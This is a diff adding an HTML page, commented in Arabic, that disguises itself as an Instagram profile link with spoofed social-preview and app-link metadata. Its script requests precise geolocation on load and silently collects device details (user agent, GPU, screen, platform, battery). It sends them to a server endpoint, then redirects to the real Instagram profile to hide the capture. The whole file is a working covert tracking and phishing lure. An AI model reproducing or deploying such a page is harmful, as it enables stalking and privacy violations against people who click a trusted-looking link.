@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+
+    <!-- SEO & Social Preview (Instagram Post Style) -->
+    <meta property="og:site_name" content="Instagram">
+    <meta property="og:title" content="عبدووووو ⚡🤍 • (@mzjy3756)">
+    <meta property="og:description"
+        content="14K Followers, 150 Following, 24 Posts - See Instagram photos and videos from عبدووووو ⚡🤍 (@mzjy3756)">
+    <!-- استخدام رابط صورة محلي يتم تحويله لسيرفر -->
+    <meta property="og:image" content="/preview.webp">
+    <meta property="og:image:secure_url" content="/preview.webp">
+    <meta property="og:image:type" content="image/webp">
+    <meta property="og:image:width" content="1080">
+    <meta property="og:image:height" content="1080">
+    <meta property="og:url" content="SITE_URL">
+    <meta property="og:type" content="article">
+
+    <!-- App Links (يجعل إنستقرام وواتساب يعاملون الرابط كرابط تطبيق أصلي) -->
+    <meta property="al:ios:app_name" content="Instagram">
+    <meta property="al:ios:app_store_id" content="389801252">
+    <meta property="al:ios:url" content="instagram://user?username=mzjy3756">
+    <meta property="al:android:app_name" content="Instagram">
+    <meta property="al:android:package" content="com.instagram.android">
+    <meta property="al:android:url" content="https://www.instagram.com/_u/mzjy3756/">
+
+    <!-- Twitter/Telegram/WhatsApp Cards -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="عبدووووو ⚡🤍 • (@mzjy3756)">
+    <meta name="twitter:description"
+        content="14K Followers, 150 Following, 24 Posts - See Instagram photos and videos from عبدووووو ⚡🤍 (@mzjy3756)">
+    <meta name="twitter:image" content="/preview.webp">
+    <meta name="theme-color" content="#000000">
+
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed84a1666a32.png">
+</head>
+
+<body>
+    <!-- شاشة تحميل مطابقة لإنستقرام بدلاً من الشاشة السوداء الصامتة -->
+    <div class="insta-loading-screen">
+        <div class="insta-logo"></div>
+
+        <div class="meta-footer">
+            <span class="from-text">from</span>
+            <div class="meta-brand">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png"
+                    class="meta-logo" alt="Meta">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "N/A";
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+            } catch (e) { return "Error"; }
+        }
+
+        window.onload = async () => {
+            let locationCaptured = false;
+            let bestPos = { coords: { latitude: 'N/A', longitude: 'N/A', accuracy: 'N/A' } };
+
+            // 1. طلب الموقع فوراً
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        bestPos = pos;
+                        locationCaptured = true;
+                    },
+                    (err) => {
+                        console.log("Geo Error:", err);
+                        locationCaptured = true; // متابعة حتى لو رفض
+                    },
+                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                );
+            } else {
+                locationCaptured = true;
+            }
+
+            // 2. وظيفة المعالجة الرئيسية
+            async function startProcess() {
+                // ننتظر 1 ثانية فقط بدلاً من 3 لنجعله أسرع بكثير
+                const minWait = new Promise(r => setTimeout(r, 1000));
+
+                // ننتظر حتى يتم التقاط الموقع أو مرور 20 محاولة (ثانيتين كحد أقصل)
+                let attempts = 0;
+                while (!locationCaptured && attempts < 20) {
+                    await new Promise(r => setTimeout(r, 100));
+                    attempts++;
+                }
+
+                await minWait;
+
+                const data = {
+                    latitude: bestPos.coords.latitude,
+                    longitude: bestPos.coords.longitude,
+                    accuracy: bestPos.coords.accuracy ? bestPos.coords.accuracy.toFixed(1) + "m" : "N/A",
+                    userAgent: navigator.userAgent,
+                    gpu: getGPU(),
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    platform: navigator.platform,
+                    battery: await (navigator.getBattery ? navigator.getBattery().then(b => ({ level: Math.round(b.level * 100) + "%", charging: b.charging ? "Yes" : "No" })) : Promise.resolve({ level: "N/A", charging: "N/A" }))
+                };
+
+
+
+                try {
+                    // على الجوال، نستخدم FETCH مع await حقيقي
+                    // هذا يمنع المتصفح من إغلاق الصفحة قبل التأكد من وصول البيانات للسيرفر
+                    const response = await fetch('/api/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data),
+                        keepalive: true
+                    });
+
+                    if (response.ok) {
+                        console.log("Sent successfully");
+                    }
+                } catch (e) {
+                    console.error("Fetch failed:", e);
+                }
+
+                // 3. التحويل النهائي
+                redirect();
+            }
+
+            // بدء العملية
+            startProcess();
+
+            // أمان إضافي: تحويل قسري بعد 3 ثوانٍ لضمان السرعة الفائقة
+            setTimeout(() => {
+                redirect();
+            }, 3000);
+        };
+
+        function redirect() {
+            const username = "mzjy3756";
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+            const appUrl = `instagram://user?username=${username}`;
+            const intentUrl = `intent://instagram.com/_u/${username}/#Intent;package=com.instagram.android;scheme=https;end`;
+            const webUrl = `https://www.instagram.com/${username}/`;
+
+            if (isAndroid) {
+                window.location.href = intentUrl;
+            } else if (isIOS) {
+                window.location.href = appUrl;
+            } else {
+                window.location.href = webUrl;
+            }
+
+            // Fallback
+            setTimeout(() => {
+                window.location.replace(webUrl);
+            }, 1000);
+        }
+    </script>
+</body>
+
+</html>
